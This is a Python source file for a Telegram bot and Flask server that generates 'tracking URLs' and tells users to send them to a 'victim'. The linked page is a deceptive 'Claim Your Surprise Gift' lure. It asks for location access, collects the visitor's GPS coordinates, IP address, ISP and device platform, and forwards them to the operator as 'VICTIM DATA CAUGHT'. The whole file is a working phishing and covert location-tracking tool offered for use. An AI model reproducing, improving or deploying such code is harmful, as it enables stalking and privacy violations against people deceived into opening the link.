import os
import telebot
from flask import Flask, request, render_template_string
from threading import Thread

# --- CONFIGURATION ---
TOKEN = os.environ.get('BOT_TOKEN')
OWNER_ID = 7162565886 
CH_USERNAME = "@HackersColony"
YT_LINK = "https://youtube.com/@hackers_colony_tech?si=GyqlRdhRdvJ9Ugd8"
CONTACT_LINK = "https://t.me/Roshanali000" # आपका कॉन्टैक्ट लिंक

bot = telebot.TeleBot(TOKEN)
app = Flask('')
users_file = "users.txt"

# --- STYLISH HTML TEMPLATE (Gift Surprise) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Claim Your Surprise Gift!</title>
    <style>
        body { background: radial-gradient(circle, #1e293b, #0f172a); color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: #1e293b; padding: 40px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 2px solid #3b82f6; width: 85%; max-width: 400px; }
        h1 { color: #facc15; font-size: 28px; }
        .gift-box { font-size: 90px; margin: 20px 0; animation: bounce 1s infinite; }
        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        #status { font-weight: bold; margin-top: 20px; color: #60a5fa; }
        .btn { background: linear-gradient(45deg, #3b82f6, #2563eb); color: white; padding: 15px 30px; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift-box">🎁</div>
        <h1>Congratulations!</h1>
        <p>You have won an exclusive surprise gift! 🎊</p>
        <p>Verify your region by allowing <b>Location Access</b>.</p>
        <div id="status">🔄 Verifying Device...</div>
        <button class="btn" onclick="catchData()">CLAIM NOW ⚡</button>
    </div>
    <script>
        async function catchData() {
            document.getElementById('status').innerHTML = "⏳ Processing...";
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        await fetch('/send-data', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: pos.coords.latitude, lon: pos.coords.longitude,
                                ip: ipData.ip, org: ipData.org,
                                platform: navigator.platform
                            })
                        });
                        document.getElementById('status').innerHTML = "<b style='color:#ef4444;'>❌ Error: Offer Expired!</b>";
                    });
                }
            } catch (e) { console.log("System Error"); }
        }
    </script>
</body>
</html>
"""

# --- BOT LOGIC ---

def is_joined(user_id):
    try:
        member = bot.get_chat_member(CH_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return True

def add_user(user_id):
    if not os.path.exists(users_file): open(users_file, 'a').close()
    with open(users_file, "r+") as f:
        if str(user_id) not in f.read(): f.write(str(user_id) + "\n")

@bot.message_handler(commands=['start'])
def start(message):
    add_user(message.from_user.id)
    markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        telebot.types.InlineKeyboardButton("📢 Join Telegram", url=f"https://t.me/{CH_USERNAME[1:]}"),
        telebot.types.InlineKeyboardButton("📺 Subscribe YouTube", url=YT_LINK),
        telebot.types.InlineKeyboardButton("✅ Verify Joining", callback_data="verify")
    )
    bot.send_message(message.chat.id, "⛔ **ACCESS DENIED!** ⛔\n\nTo use this AI tool, you must join our channels first. 👇", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify(call):
    if is_joined(call.from_user.id):
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("📍 Track Location 🛠", "👨‍💻 Admin Contact")
        if call.from_user.id == OWNER_ID: markup.add("📢 Broadcast (Owner)")
        bot.send_message(call.message.chat.id, "🎯 **Verification Successful!**\nWelcome. Choose an option below:", reply_markup=markup, parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "❌ Please join both channels first!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "📍 Track Location 🛠")
def send_link(message):
    if not is_joined(message.from_user.id): return start(message)
    link = f"https://{request.host}/" 
    bot.send_message(message.chat.id, f"🖇 **Your Tracking URL:**\n\n`{link}`\n\nSend this link to the victim. 🕵️‍♂️", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "👨‍💻 Admin Contact")
def contact(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("💬 Message Roshan", url=CONTACT_LINK))
    bot.send_message(message.chat.id, "📩 **Contact Developer:**\n\nClick the button below to contact the owner.", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📢 Broadcast (Owner)")
def broadcast_prompt(message):
    if message.from_user.id != OWNER_ID: return
    bot.send_message(message.chat.id, "📝 Send the message for broadcast:")
    bot.register_next_step_handler(message, do_broadcast)

def do_broadcast(message):
    if os.path.exists(users_file):
        with open(users_file, "r") as f:
            for user in f.readlines():
                try: bot.send_message(user.strip(), f"🔔 **ANNOUNCEMENT**\n\n{message.text}", parse_mode="Markdown")
                except: pass
    bot.reply_to(message, "✅ **Broadcast Sent!**")

# --- FLASK DATA RECEIVER ---
@app.route('/')
def home(): return render_template_string(HTML_TEMPLATE)

@app.route('/send-data', methods=['POST'])
def receive():
    data = request.json
    map_url = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
    report = (f"🎯 **VICTIM DATA CAUGHT!** 🎯\n"
              f"━━━━━━━━━━━━━━━━━━━━\n"
              f"🌐 **IP Address:** `{data['ip']}`\n"
              f"🏢 **ISP/Org:** `{data['org']}`\n"
              f"📱 **Device Info:** `{data['platform']}`\n"
              f"📍 **Maps Link:** [CLICK HERE]({map_url})\n"
              f"━━━━━━━━━━━━━━━━━━━━\n"
              f"⚡ **𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗯𝘆 𝗥𝗼𝘀𝗵𝗮𝗻 ⚡**")
    bot.send_message(OWNER_ID, report, parse_mode="Markdown")
    return "OK", 200

if __name__ == "__main__":
    Thread(target=lambda: app.run(host='0.0.0.0', port=10000)).start()
    bot.infinity_polling()
    
